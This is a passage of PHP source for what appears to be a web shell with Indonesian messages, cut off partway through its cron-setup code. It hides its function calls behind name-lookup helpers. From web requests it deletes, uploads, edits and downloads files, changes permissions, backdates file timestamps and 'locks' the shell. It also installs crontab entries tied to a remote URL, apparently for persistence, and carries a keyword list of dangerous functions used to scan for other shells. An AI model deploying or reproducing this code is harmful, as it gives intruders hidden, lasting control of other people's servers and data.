$scanner_tokenNeedles = ['base64_decode','rawurldecode','urldecode','gzinflate','gzuncompress','str_rot13','convert_uu','htmlspecialchars_decode','bin2hex','hex2bin','hexdec','chr','strrev','goto','implode','strtr','extract','parse_str','substr','mb_substr','str_replace','substr_replace','preg_replace','exif_read_data','readgzfile','eval','exec','shell_exec','system','passthru','pcntl_fork','fsockopen','proc_open','popen ','assert','posix_kill','posix_setpgid','posix_setsid','posix_setuid','proc_nice','proc_close','proc_terminate','apache_child_terminate','posix_getuid','posix_geteuid','posix_getegid','posix_getpwuid','posix_getgrgid','posix_mkfifo','posix_getlogin','posix_ttyname','getenv','proc_get_status','get_cfg_var','disk_free_space','disk_total_space','diskfreespace','getlastmo','getmyinode','getmypid','getmyuid','getmygid','fileowner','filegroup','get_current_user','pathinfo','getcwd','sys_get_temp_dir','basename','phpinfo','mysql_connect','mysqli_connect','mysqli_query','mysql_query','fopen','fsockopen','file_put_contents','file_get_contents','url_get_contents','stream_get_meta_data','move_uploaded_file','$_files','copy','include','include_once','require','require_once','__file__','mail','putenv','curl_init','tmpfile','allow_url_fopen','ini_set','set_time_limit','session_start','symlink','__halt_compiler','__compiler_halt_offset__','error_reporting','create_function','get_magic_quotes_gpc','$auth_pass','$password',];

function scanner_recursiveScan($directory, &$entries_array = array()) {
    global $is_dir_fn, $function_exists_fn; $is_readable_local_scan = _get_fn_name_global_init_v3('_g_ascii_is_readable', 'is_readable');
    $handle = @opendir($directory); if (!$handle) return $entries_array;
    while (($entry = readdir($handle)) !== false) {
        if ($entry == '.' || $entry == '..') continue;
        $full_entry_path = rtrim($directory, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $entry;
        if (call_user_func($is_dir_fn, $full_entry_path) && @call_user_func($is_readable_local_scan, $full_entry_path) && !is_link($full_entry_path)) {
            // Add directory itself to the list before recursing
            $entries_array['all_items'][] = $full_entry_path;
            $entries_array = scanner_recursiveScan($full_entry_path, $entries_array);
        }
        else {
            $entries_array['all_items'][] = $full_entry_path;
        }
    } closedir($handle); return $entries_array;
}

function scanner_sortByLastModified($files) {
    if (empty($files) || !is_array($files)) return [];
    $filemtime_local_scan = _get_fn_name_global_init_v3('_g_ascii_filemtime', 'filemtime');
    if (empty($filemtime_local_scan) || !function_exists($filemtime_local_scan)) return $files; // Ensure function_exists check
    // Suppress errors for filemtime if files are unreadable, etc.
    $timestamps = array_map(function($file) use ($filemtime_local_scan) {
        return @call_user_func($filemtime_local_scan, $file);
    }, $files);
    
    // Filter out false values which indicate error from filemtime
    // and preserve original keys before sorting
    $valid_timestamps = [];
    $original_files = $files; // Keep a copy
    $files_to_sort = [];

    foreach ($timestamps as $key => $ts) {
        if ($ts !== false) {
            $valid_timestamps[$key] = $ts;
            $files_to_sort[$key] = $original_files[$key];
        }
    }
    
    if (!empty($valid_timestamps)) {
         @array_multisort($valid_timestamps, SORT_DESC, $files_to_sort);
         // Combine sorted files with those that couldn't be stat'd (append them)
         $unstatable_files = array_diff_key($original_files, $valid_timestamps);
         return array_merge($files_to_sort, array_values($unstatable_files));
    }
    return $original_files; // Return original if no valid timestamps
}


function scanner_getFileTokens($filename) {
    $file_get_contents_local_scan = _get_fn_name_global_init_v3('_g_ascii_file_get_contents', 'file_get_contents');
    if (empty($file_get_contents_local_scan) || !function_exists($file_get_contents_local_scan) || !function_exists('token_get_all')) return [];
    $fileContent = @call_user_func($file_get_contents_local_scan, $filename); if ($fileContent === false) return [];
    $tokens = @token_get_all($fileContent); $output = array(); $tokenCount = is_array($tokens) ? count($tokens) : 0;
    if ($tokenCount > 0) { for ($i = 0; $i < $tokenCount; $i++) { if (isset($tokens[$i][1])) $output[] .= strtolower($tokens[$i][1]); }}
    $output = array_values(array_unique(array_filter(array_map("trim", $output)))); return $output;
}

function scanner_compareTokens($tokenNeedles, $tokenHaystack) {
    $output = array(); if (empty($tokenHaystack)) return $output;
    foreach ($tokenNeedles as $tokenNeedle) { if (in_array($tokenNeedle, $tokenHaystack)) $output[] = $tokenNeedle; } return $output;
}

function deleteDirectoryRecursive($dir) {
    if (!file_exists($dir)) { return true; }
    if (!is_dir($dir)) { return unlink($dir); }
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') { continue; }
        if (!deleteDirectoryRecursive($dir . DIRECTORY_SEPARATOR . $item)) { return false; }
    }
    return rmdir($dir);
}

function addDirectoryToZip($zip, $dir, $baseInZip) {
    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::LEAVES_ONLY
    );

    foreach ($files as $name => $file) {
        if (!$file->isDir()) {
            $filePath = $file->getRealPath();
            $relativePath = $baseInZip . substr($filePath, strlen($dir) + 1);
            $zip->addFile($filePath, $relativePath);
        }
    }
}

if (isset($_GET['file_action'])) {
    $file_action_get = $_GET['file_action'];
    $file_target_basename_raw_get = isset($_GET['target']) ? call_user_func($basename_fn, $_GET['target']) : null;
    $file_target_get = null;
    if ($file_target_basename_raw_get) {
        $potential_target_path_get = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file_target_basename_raw_get;
        $verified_target_path_get = $potential_target_path_get;
        $file_exists_local_get_action = _get_fn_name_global_init_v3('_g_ascii_file_exists','file_exists');
        if (call_user_func($function_exists_fn, $realpath_fn)) {
            $rtp_get = @call_user_func($realpath_fn, $potential_target_path_get);
            $resolved_current_path_for_check_get = @call_user_func($realpath_fn, $current_path);
            if ($rtp_get && $resolved_current_path_for_check_get && strpos($rtp_get, $resolved_current_path_for_check_get) === 0 && @call_user_func($file_exists_local_get_action, $rtp_get)) { $verified_target_path_get = $rtp_get; }
            elseif (@call_user_func($file_exists_local_get_action, $potential_target_path_get)){ $verified_target_path_get = $potential_target_path_get; }
            else { $verified_target_path_get = null; }
        }
        if ($verified_target_path_get && @call_user_func($file_exists_local_get_action, $verified_target_path_get)) { $file_target_get = $verified_target_path_get; }
        else { $error_messages[] = "Error Aksi File: Target '" . call_user_func($htmlspecialchars_fn, $file_target_basename_raw_get) . "' tidak valid atau di luar jangkauan."; }
    }

    if ($file_target_get) {
        $is_writable_fn_action_get = _get_fn_name_global_init_v3('_g_ascii_is_writable', 'is_writable');
        $unlink_fn_action_get = _get_fn_name_global_init_v3('_g_ascii_unlink', 'unlink');
        $rmdir_fn_action_get = _get_fn_name_global_init_v3('_g_ascii_rmdir', 'rmdir');
        $rename_fn_action_get = _get_fn_name_global_init_v3('_g_ascii_rename', 'rename');
        $file_target_display_name_get_action = call_user_func($basename_fn, $file_target_get);

        if ($file_action_get === 'delete') {
            $parent_dir_of_target_get_action = call_user_func($dirname_fn, $file_target_get);
            if (!empty($is_writable_fn_action_get) && (!call_user_func($function_exists_fn, $is_writable_fn_action_get) || !@call_user_func($is_writable_fn_action_get, $parent_dir_of_target_get_action))) { $error_messages[] = "Delete Error: Direktori '" . call_user_func($htmlspecialchars_fn, $parent_dir_of_target_get_action) . "' tidak writable."; }
            elseif (call_user_func($is_dir_fn, $file_target_get)) { if (!empty($rmdir_fn_action_get) && deleteDirectoryRecursive($file_target_get)) { $output_messages[] = "Direktori '" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "' dihapus."; } else {$error_messages[] = "Gagal hapus direktori (fungsi rmdir mungkin tidak tersedia atau gagal).";}}
            else { if (!empty($unlink_fn_action_get) && @call_user_func($unlink_fn_action_get, $file_target_get)) { $output_messages[] = "File '" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "' dihapus."; } else { $error_messages[] = "Gagal hapus file '" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "'."; } }
        } elseif ($file_action_get === 'rename' && isset($_GET['new_name'])) {
            $new_name_raw_get = call_user_func($trim_fn, $_GET['new_name']); $new_name_get = call_user_func($basename_fn, $new_name_raw_get);
            if (empty($new_name_get) || strpbrk($new_name_get, "\\/?%*:|\"<>") !== FALSE || $new_name_get === "." || $new_name_get === "..") { $error_messages[] = "Rename Error: Nama baru tidak valid."; }
            elseif (!empty($is_writable_fn_action_get) && (!call_user_func($function_exists_fn, $is_writable_fn_action_get) || !@call_user_func($is_writable_fn_action_get, call_user_func($dirname_fn, $file_target_get)))) { $error_messages[] = "Rename Error: Direktori parent tidak writable."; }
            else {
                $new_path_target_get = call_user_func($dirname_fn, $file_target_get) . DIRECTORY_SEPARATOR . $new_name_get;
                $file_exists_local_check_get_rename_action_get = _get_fn_name_global_init_v3('_g_ascii_file_exists','file_exists');
                if (call_user_func($file_exists_local_check_get_rename_action_get, $new_path_target_get)) { $error_messages[] = "Rename Error: Nama '" . call_user_func($htmlspecialchars_fn, $new_name_get) . "' sudah ada."; }
                elseif (!empty($rename_fn_action_get) && @call_user_func($rename_fn_action_get, $file_target_get, $new_path_target_get)) {
                    $output_messages[] = "'" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "' di-rename ke '" . call_user_func($htmlspecialchars_fn, $new_name_get) . "'.";
                    if (call_user_func($function_exists_fn, $realpath_fn) && @call_user_func($realpath_fn, $file_target_get) == @call_user_func($realpath_fn, $current_path)) { $_SESSION['current_explorer_path'] = $new_path_target_get; header("Location: " . $_SERVER['PHP_SELF'] . "?menu=explorer&path=" . urlencode($new_path_target_get)); exit; }
                } else { $error_messages[] = "Gagal rename '" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "'."; }
            }
        } elseif ($file_action_get === 'download' && !call_user_func($is_dir_fn, $file_target_get)) {
            $header_fn_get_dl_action_get_final = _get_fn_name_global_init_v3('_g_ascii_header', 'header'); $filesize_fn_get_dl_action_get_final = _get_fn_name_global_init_v3('_g_ascii_filesize', 'filesize');
            $readfile_fn_get_dl_action_get_final = _get_fn_name_global_init_v3('_g_ascii_readfile', 'readfile'); $is_readable_fn_get_dl_action_get_final = _get_fn_name_global_init_v3('_g_ascii_is_readable', 'is_readable');
             if (empty($is_readable_fn_get_dl_action_get_final) || !call_user_func($function_exists_fn, $is_readable_fn_get_dl_action_get_final) || !@call_user_func($is_readable_fn_get_dl_action_get_final, $file_target_get)) { $error_messages[] = "Download Error: File tidak readable."; }
             elseif (!empty($header_fn_get_dl_action_get_final) && call_user_func($function_exists_fn, $header_fn_get_dl_action_get_final) && !empty($readfile_fn_get_dl_action_get_final) && call_user_func($function_exists_fn, $readfile_fn_get_dl_action_get_final)) {
                if (headers_sent($file_header_get_dl_action_sent_get_final, $line_header_get_dl_action_sent_get_final)) { $error_messages[] = "Download Error: Headers already sent at $file_header_get_dl_action_sent_get_final:$line_header_get_dl_action_sent_get_final."; }
                else {
                    @ob_end_clean(); @ini_set('zlib.output_compression', 'Off');
                    call_user_func($header_fn_get_dl_action_get_final, 'Content-Description: File Transfer'); call_user_func($header_fn_get_dl_action_get_final, 'Content-Type: application/octet-stream');
                    call_user_func($header_fn_get_dl_action_get_final, 'Content-Disposition: attachment; filename="' . call_user_func($basename_fn, $file_target_get) . '"');
                    call_user_func($header_fn_get_dl_action_get_final, 'Expires: 0'); call_user_func($header_fn_get_dl_action_get_final, 'Cache-Control: must-revalidate'); call_user_func($header_fn_get_dl_action_get_final, 'Pragma: public');
                    if(!empty($filesize_fn_get_dl_action_get_final) && call_user_func($function_exists_fn, $filesize_fn_get_dl_action_get_final)) { $fsize_get_dl_action_get_final = @call_user_func($filesize_fn_get_dl_action_get_final, $file_target_get); if ($fsize_get_dl_action_get_final !== false) call_user_func($header_fn_get_dl_action_get_final, 'Content-Length: ' . $fsize_get_dl_action_get_final); }
                    flush(); $readfile_result_get_dl_action_get_final = @call_user_func($readfile_fn_get_dl_action_get_final, $file_target_get); exit;
                }
            } else { $error_messages[] = "Download Error: Fungsi header/readfile tidak ada."; }
        } elseif ($file_action_get === 'edit' && !call_user_func($is_dir_fn, $file_target_get)) { $active_menu = 'editor'; }
        elseif ($file_action_get === 'lock' && !call_user_func($is_dir_fn, $file_target_get)) {
            $result_message = lock_file_or_shell($file_target_get);
            if (strpos($result_message, 'Sukses') === 0) {
                $output_messages[] = $result_message;
            } else {
                $error_messages[] = $result_message;
            }
        } elseif ($file_action_get === 'unzip' && !call_user_func($is_dir_fn, $file_target_get)) {
            if (strtolower(pathinfo($file_target_get, PATHINFO_EXTENSION)) !== 'zip') {
                $error_messages[] = "Unzip Error: Target bukan file .zip.";
            } elseif (!class_exists('ZipArchive')) {
                $error_messages[] = "Unzip Error: Class 'ZipArchive' tidak ditemukan. Ekstensi PHP Zip tidak diaktifkan.";
            } else {
                $zip = new ZipArchive;
                if ($zip->open($file_target_get) === TRUE) {
                    if ($zip->extractTo($current_path)) {
                        $output_messages[] = "File '" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "' berhasil di-unzip.";
                    } else {
                        $error_messages[] = "Unzip Error: Gagal mengekstrak file dari '" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "'.";
                    }
                    $zip->close();
                } else {
                    $error_messages[] = "Unzip Error: Gagal membuka file arsip '" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "'.";
                }
            }
        }
    } elseif (isset($_GET['file_action']) && empty($error_messages)) { $error_messages[] = "Aksi file dibatalkan: Target tidak valid."; }
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $action_post = isset($_POST['action']) ? $_POST['action'] : null;
    if ($active_menu === 'editor' && isset($_POST['save_file_content']) && isset($_POST['file_to_edit_path'])) {
        $file_to_edit_from_post_save_action_post_final = $_POST['file_to_edit_path']; $file_content_to_save_post_action_post_final = $_POST['file_content'];
        $file_exists_local_save_post_action_editor_post_final = _get_fn_name_global_init_v3('_g_ascii_file_exists','file_exists');
        $is_writable_local_save_post_action_editor_post_final = _get_fn_name_global_init_v3('_g_ascii_is_writable','is_writable');
        $file_put_contents_local_save_post_action_editor_post_final = _get_fn_name_global_init_v3('_g_ascii_file_put_contents','file_put_contents');
        if (!empty($file_exists_local_save_post_action_editor_post_final) && call_user_func($file_exists_local_save_post_action_editor_post_final, $file_to_edit_from_post_save_action_post_final) && !empty($is_writable_local_save_post_action_editor_post_final) && call_user_func($is_writable_local_save_post_action_editor_post_final, $file_to_edit_from_post_save_action_post_final)) {
            if (!empty($file_put_contents_local_save_post_action_editor_post_final) && @call_user_func($file_put_contents_local_save_post_action_editor_post_final, $file_to_edit_from_post_save_action_post_final, $file_content_to_save_post_action_post_final) !== false) {
                $output_messages[] = "File '" . call_user_func($htmlspecialchars_fn, call_user_func($basename_fn, $file_to_edit_from_post_save_action_post_final)) . "' disimpan.";
                 header("Location: " . $_SERVER['PHP_SELF'] . "?menu=explorer&path=" . urlencode(call_user_func($dirname_fn, $file_to_edit_from_post_save_action_post_final)) . "&file_action_status=save_success"); exit;
            } else { $error_messages[] = "Gagal simpan file '" . call_user_func($htmlspecialchars_fn, call_user_func($basename_fn, $file_to_edit_from_post_save_action_post_final)) . "'."; }
        } else { $error_messages[] = "File tidak ada/tidak writable: " . call_user_func($htmlspecialchars_fn, call_user_func($basename_fn, $file_to_edit_from_post_save_action_post_final)); }
    }
    elseif ($action_post === 'upload_file') {
        if (isset($_FILES['uploaded_file'])) {
            $is_uploaded_file_fn_upload_post_action_uploader_post_final = _get_fn_name_global_init_v3('_g_ascii_is_uploaded_file', 'is_uploaded_file');
            $move_uploaded_file_fn_upload_post_action_uploader_post_final = _get_fn_name_global_init_v3('_g_ascii_move_uploaded_file', 'move_uploaded_file');
            if (!empty($is_uploaded_file_fn_upload_post_action_uploader_post_final) && call_user_func($is_uploaded_file_fn_upload_post_action_uploader_post_final, $_FILES['uploaded_file']['tmp_name'])) {
                $upload_filename_orig_post_action_uploader_post_final = call_user_func($basename_fn, $_FILES['uploaded_file']['name']);
                $upload_filename_post_action_uploader_post_final = str_replace(["/", "\\", "..", "\0"], "", $upload_filename_orig_post_action_uploader_post_final);
                if (empty($upload_filename_post_action_uploader_post_final)) { $error_messages[] = ">> UPLOAD_ERROR: Nama file tidak valid."; }
                else {
                    $destination_post_action_uploader_post_final = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $upload_filename_post_action_uploader_post_final;
                    if (!empty($move_uploaded_file_fn_upload_post_action_uploader_post_final) && @call_user_func($move_uploaded_file_fn_upload_post_action_uploader_post_final, $_FILES['uploaded_file']['tmp_name'], $destination_post_action_uploader_post_final)) {
                        $output_messages[] = ">> UPLOAD_SUCCESS: File '" . call_user_func($htmlspecialchars_fn, $upload_filename_post_action_uploader_post_final) . "' diupload ke '" . call_user_func($htmlspecialchars_fn, $destination_post_action_uploader_post_final) . "'";
                    } else { $php_err_post_action_uploader_post_final = error_get_last(); $err_msg_post_action_uploader_post_final = $php_err_post_action_uploader_post_final ? " PHP Error: " . $php_err_post_action_uploader_post_final['message'] : ""; $error_messages[] = ">> UPLOAD_ERROR: Gagal pindah file." . $err_msg_post_action_uploader_post_final; }
                }
            } elseif ($_FILES['uploaded_file']['error'] !== UPLOAD_ERR_NO_FILE) { $error_messages[] = ">> UPLOAD_ERROR: Kode Error: " . $_FILES['uploaded_file']['error']; }
        }
    }
    elseif ($action_post === 'create_new_item') {
        if(isset($_POST['new_folder_name'])) {
            $new_folder_name = call_user_func($basename_fn, call_user_func($trim_fn, $_POST['new_folder_name']));
            if(!empty($new_folder_name)) {
                $mkdir_fn_post = _get_fn_name_global_init_v3('_g_ascii_mkdir', 'mkdir');
                if(!empty($mkdir_fn_post) && @call_user_func($mkdir_fn_post, $current_path . DIRECTORY_SEPARATOR . $new_folder_name)) {
                    $output_messages[] = "Folder '".call_user_func($htmlspecialchars_fn, $new_folder_name)."' berhasil dibuat.";
                } else {
                    $error_messages[] = "Gagal membuat folder '".call_user_func($htmlspecialchars_fn, $new_folder_name)."'.";
                }
            } else { $error_messages[] = "Nama folder tidak valid."; }
        } elseif(isset($_POST['new_file_name'])) {
            $new_file_name = call_user_func($basename_fn, call_user_func($trim_fn, $_POST['new_file_name']));
            if(!empty($new_file_name)) {
                $touch_fn_post = _get_fn_name_global_init_v3('_g_ascii_touch', 'touch');
                if(!empty($touch_fn_post) && @call_user_func($touch_fn_post, $current_path . DIRECTORY_SEPARATOR . $new_file_name)) {
                    $output_messages[] = "File '".call_user_func($htmlspecialchars_fn, $new_file_name)."' berhasil dibuat.";
                } else {
                    $error_messages[] = "Gagal membuat file '".call_user_func($htmlspecialchars_fn, $new_file_name)."'.";
                }
            } else { $error_messages[] = "Nama file tidak valid."; }
        }
    }
    elseif ($action_post === 'change_chmod' && isset($_POST['target'], $_POST['new_perms'])) {
        $chmod_target_basename = call_user_func($basename_fn, $_POST['target']);
        $chmod_target_path = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $chmod_target_basename;
        $new_perms_str = call_user_func($trim_fn, $_POST['new_perms']);

        if (preg_match('/^[0-7]{3,4}$/', $new_perms_str)) {
            $new_perms_oct = octdec($new_perms_str);
            $chmod_fn_post_action = _get_fn_name_global_init_v3('_g_ascii_chmod', 'chmod');
            $file_exists_fn_post_action = _get_fn_name_global_init_v3('_g_ascii_file_exists', 'file_exists');

            if (!empty($file_exists_fn_post_action) && call_user_func($file_exists_fn_post_action, $chmod_target_path) && !empty($chmod_fn_post_action) && call_user_func($function_exists_fn, $chmod_fn_post_action)) {
                if (@call_user_func($chmod_fn_post_action, $chmod_target_path, $new_perms_oct)) {
                    $output_messages[] = "Izin untuk '" . call_user_func($htmlspecialchars_fn, $chmod_target_basename) . "' diubah menjadi " . call_user_func($htmlspecialchars_fn, $new_perms_str) . ".";
                } else {
                    $error_messages[] = "Gagal mengubah izin untuk '" . call_user_func($htmlspecialchars_fn, $chmod_target_basename) . "'.";
                }
            } else {
                $error_messages[] = "Chmod Error: Target tidak ditemukan atau fungsi chmod dinonaktifkan.";
            }
        } else {
            $error_messages[] = "Chmod Error: Format izin tidak valid. Gunakan 3 atau 4 digit oktal (misal: 755 atau 0755).";
        }
    }
    elseif ($action_post === 'change_mtime' && isset($_POST['target'], $_POST['new_mtime'])) {
        $mtime_target_basename = call_user_func($basename_fn, $_POST['target']);
        $mtime_target_path = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $mtime_target_basename;
        $new_mtime_str = call_user_func($trim_fn, $_POST['new_mtime']);
        $new_timestamp = strtotime($new_mtime_str);

        if ($new_timestamp !== false) {
            $touch_fn_post_action = _get_fn_name_global_init_v3('_g_ascii_touch', 'touch');
            $file_exists_fn_post_action = _get_fn_name_global_init_v3('_g_ascii_file_exists', 'file_exists');
            if (!empty($file_exists_fn_post_action) && call_user_func($file_exists_fn_post_action, $mtime_target_path) && !empty($touch_fn_post_action) && call_user_func($function_exists_fn, $touch_fn_post_action)) {
                if (@call_user_func($touch_fn_post_action, $mtime_target_path, $new_timestamp)) {
                    $output_messages[] = "Last Modify untuk '" . call_user_func($htmlspecialchars_fn, $mtime_target_basename) . "' diubah menjadi " . date('Y-m-d H:i:s', $new_timestamp) . ".";
                } else {
                    $error_messages[] = "Gagal mengubah Last Modify untuk '" . call_user_func($htmlspecialchars_fn, $mtime_target_basename) . "'.";
                }
            } else {
                 $error_messages[] = "Touch Error: Target tidak ditemukan atau fungsi touch dinonaktifkan.";
            }
        } else {
            $error_messages[] = "Touch Error: Format tanggal/waktu tidak valid. Gunakan format 'YYYY-MM-DD HH:MM:SS'.";
        }
    }
    elseif ($action_post === 'bulk_action' && isset($_POST['bulk_operation'], $_POST['selected_items'])) {
        $operation = $_POST['bulk_operation'];
        $items = $_POST['selected_items'];

        if (empty($items)) {
            $error_messages[] = "Tidak ada item yang dipilih untuk aksi massal.";
        } else {
            if ($operation === 'delete') {
                $deleted_count = 0;
                $error_count = 0;
                foreach ($items as $item_name) {
                    $item_path = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item_name;
                    if (file_exists($item_path)) {
                        if (deleteDirectoryRecursive($item_path)) {
                            $deleted_count++;
                        } else {
                            $error_count++;
                        }
                    } else {
                        $error_count++;
                    }
                }
                $output_messages[] = "Aksi hapus massal selesai. Berhasil: $deleted_count, Gagal: $error_count.";

            } elseif ($operation === 'zip') {
                if (!class_exists('ZipArchive')) {
                    $error_messages[] = "Zip Error: Class 'ZipArchive' tidak ditemukan. Ekstensi PHP Zip tidak diaktifkan.";
                } else {
                    $zip_filename = !empty($_POST['zip_filename']) ? call_user_func($basename_fn, $_POST['zip_filename']) : 'archive.zip';
                    if (substr(strtolower($zip_filename), -4) !== '.zip') {
                        $zip_filename .= '.zip';
                    }
                    $zip_filepath = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $zip_filename;

                    $zip = new ZipArchive();
                    if ($zip->open($zip_filepath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                        $added_count = 0;
                        foreach ($items as $item_name) {
                            $item_path = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item_name;
                            if (file_exists($item_path)) {
                                if (is_dir($item_path)) {
                                    addDirectoryToZip($zip, $item_path, $item_name . '/');
                                } else {
                                    $zip->addFile($item_path, $item_name);
                                }
                                $added_count++;
                            }
                        }
                        $zip->close();
                        $output_messages[] = "Berhasil membuat arsip '" . call_user_func($htmlspecialchars_fn, $zip_filename) . "' dengan $added_count item.";
                    } else {
                        $error_messages[] = "Gagal membuat file arsip '" . call_user_func($htmlspecialchars_fn, $zip_filename) . "'.";
                    }
                }
            }
        }
    }
    elseif ($action_post === 'setup_cron' && $active_menu === 'cron') {
        $url_cron_post_action_setup_post_final = isset($_POST['url_cron']) ? $_POST['url_cron'] : '';
        if (!empty($url_cron_post_action_setup_post_final)) {
            $path_to_use_cron_post_action_setup_post_final = $auto_path_script;
            $shell_filename_input_cron_post_action_setup_post_final = isset($_POST['shell_filename_cron']) ? call_user_func($trim_fn, $_POST['shell_filename_cron']) : '';
            $processed_shell_filename_cron_post_action_setup_post_final = call_user_func($basename_fn, $shell_filename_input_cron_post_action_setup_post_final) ?: 'index.php';
            $filter_var_fn_cron_post_action_setup_post_final = _get_fn_name_global_init_v3('_g_ascii_filter_var', 'filter_var');
            if (empty($filter_var_fn_cron_post_action_setup_post_final) || !call_user_func($filter_var_fn_cron_post_action_setup_post_final, $url_cron_post_action_setup_post_final, FILTER_VALIDATE_URL)) { $error_messages[] = ">> ERROR_CRON: URL TIDAK VALID"; }
            else {
                $cronCommands_post_action_setup_post_final = call_user_func('generateCronCommands', $path_to_use_cron_post_action_setup_post_final, $url_cron_post_action_setup_post_final, $processed_shell_filename_cron_post_action_setup_post_final);
                $crontab_path_post_action_setup_post_final = '/usr/bin/crontab'; $crontab_list_command_post_action_setup_post_final = $crontab_path_post_action_setup_post_final . ' -l 2>&1';
                $existing_crontab_post_action_setup_post_final = call_user_func('try_execute_command', $crontab_list_command_post_action_setup_post_final, null);
                $is_string_fn_cron_post_action_setup_post_final = _get_fn_name_global_init_v3('_g_ascii_is_string', 'is_string');
                $strpos_fn_cron_post_action_setup_post_final = _get_fn_name_global_init_v3('_g_ascii_strpos', 'strpos');
                $get_current_user_fn_cron_post_action_setup_post_final = _get_fn_name_global_init_v3('_g_ascii_get_current_user', 'get_current_user');

                if ($existing_crontab_post_action_setup_post_final === null && PHP_OS_FAMILY !== 'Windows') { $error_messages[] = ">> CRITICAL_ERROR_CRON: GAGAL EKSEKUSI SHELL."; }
                elseif (!empty($is_string_fn_cron_post_action_setup_post_final) && call_user_func($is_string_fn_cron_post_action_setup_post_final, $existing_crontab_post_action_setup_post_final) && !empty($strpos_fn_cron_post_action_setup_post_final) && call_user_func($strpos_fn_cron_post_action_setup_post_final, $existing_crontab_post_action_setup_post_final, 'command not found') !== false) { $error_messages[] = ">> CRITICAL_ERROR_CRON: Perintah '{$crontab_path_post_action_setup_post_final}' TIDAK DITEMUKAN."; }
                elseif (!empty($is_string_fn_cron_post_action_setup_post_final) && call_user_func($is_string_fn_cron_post_action_setup_post_final, $existing_crontab_post_action_setup_post_final) && !empty($strpos_fn_cron_post_action_setup_post_final) && call_user_func($strpos_fn_cron_post_action_setup_post_final, $existing_crontab_post_action_setup_post_final, 'not allowed') !== false) { $current_user_cron_msg_post_action_setup_post_final = (call_user_func($function_exists_fn, $get_current_user_fn_cron_post_action_setup_post_final) ? call_user_func($get_current_user_fn_cron_post_action_setup_post_final) : 'UNKNOWN'); $error_messages[] = ">> CRITICAL_ERROR_CRON: User '" . $current_user_cron_msg_post_action_setup_post_final . "' TIDAK DIIZINKAN."; }
                elseif (!empty($is_string_fn_cron_post_action_setup_post_final) && call_user_func($is_string_fn_cron_post_action_setup_post_final, $existing_crontab_post_action_setup_post_final) && !empty($strpos_fn_cron_post_action_setup_post_final) && (call_user_func($strpos_fn_cron_post_action_setup_post_final, $existing_crontab_post_action_setup_post_final, 'fork: retry: Resource temporarily unavailable') !== false || call_user_func($strpos_fn_cron_post_action_setup_post_final, $existing_crontab_post_action_setup_post_final, 'fork: Resource temporarily unavailable') !== false )) { $error_messages[] = ">> CRITICAL_ERROR_CRON: Gagal fork crontab. Output: <pre>" . call_user_func($htmlspecialchars_fn, $existing_crontab_post_action_setup_post_final) . "</pre>"; }
                else {
                    if (!empty($is_string_fn_cron_post_action_setup_post_final) && call_user_func($is_string_fn_cron_post_action_setup_post_final, $existing_crontab_post_action_setup_post_final) && !empty($strpos_fn_cron_post_action_setup_post_final) && call_user_func($strpos_fn_cron_post_action_setup_post_final, $existing_crontab_post_action_setup_post_final, 'no crontab for') !== false) { $existing_crontab_post_action_setup_post_final = ''; }
                    elseif ($existing_crontab_post_action_setup_post_final === false) { $existing_crontab_post_action_setup_post_final = ''; $error_messages[] = ">> WARNING_CRON: Gagal baca crontab."; }
                    $new_crontab_content_post_action_setup_post_final = ($existing_crontab_post_action_setup_post_final && !empty($is_string_fn_cron_post_action_setup_post_final) && call_user_func($is_string_fn_cron_post_action_setup_post_final, $existing_crontab_post_action_setup_post_final)) ? call_user_func($trim_fn, $existing_crontab_post_action_setup_post_final) . "\n" : "";
                    $commands_added_count_post_action_setup_post_final = 0; $substr_fn_cron_post_action_setup_post_final = _get_fn_name_global_init_v3('_g_ascii_substr', 'substr');
                    foreach ($cronCommands_post_action_setup_post_final as $command_item_post_action_setup_post_final) {
                        $space_pos_post_action_setup_post_final = !empty($strpos_fn_cron_post_action_setup_post_final) ? call_user_func($strpos_fn_cron_post_action_setup_post_final, $command_item_post_action_setup_post_final, ' ') : false;
                        $command_body_post_action_setup_post_final = ($space_pos_post_action_setup_post_final !== false && !empty($substr_fn_cron_post_action_setup_post_final)) ? call_user_func($substr_fn_cron_post_action_setup_post_final, $command_item_post_action_setup_post_final, $space_pos_post_action_setup_post_final + 1) : $command_item_post_action_setup_post_final;
                        if (empty($command_body_post_action_setup_post_final) || (!empty($strpos_fn_cron_post_action_setup_post_final) && call_user_func($strpos_fn_cron_post_action_setup_post_final, $new_crontab_content_post_action_setup_post_final, $command_body_post_action_setup_post_final) === false)) { $new_crontab_content_post_action_setup_post_final .= $command_item_post_action_setup_post_final . "\n"; $commands_added_count_post_action_setup_post_final++; }
                    }
                    $sys_get_temp_dir_fn_post_action_setup_post_final = _get_fn_name_global_init_v3('_g_ascii_sys_get_temp_dir', 'sys_get_temp_dir');
                    $tempnam_fn_post_action_setup_post_final = _get_fn_name_global_init_v3('_g_ascii_tempnam', 'tempnam');
                    $file_put_contents_fn_post_action_setup_post_final = _get_fn_name_global_init_v3('_g_ascii_file_put_contents','file_put_contents');
                    $unlink_fn_post_action_setup_post_final = _get_fn_name_global_init_v3('_g_ascii_unlink','unlink');
